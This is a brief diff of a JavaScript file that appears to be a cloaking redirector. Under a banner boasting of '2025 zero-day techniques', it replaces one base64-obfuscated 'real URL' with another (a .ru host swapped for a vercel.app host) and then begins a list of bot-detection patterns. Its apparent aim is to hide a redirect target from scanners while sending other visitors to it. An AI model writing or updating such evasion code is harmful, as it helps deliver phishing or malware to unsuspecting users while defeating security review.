@@ -3,7 +3,7 @@
 //  Keeps 100 % of your original logic + 2025 zero-day techniques
 // ╚══════════════════════════════════════════════════════════╝
 
-const ENCRYPTED_REAL_URL = "aHR0cHM6Ly9zcnYyMzM2MTkuaG9zdGVyLXRlc3QucnUvcmVk";
+const ENCRYPTED_REAL_URL = "aHR0cHM6Ly9maWxlLWJ0NWcudmVyY2VsLmFwcA==";
 
 // Your original bot patterns (kept exactly)
 const botPatterns = [
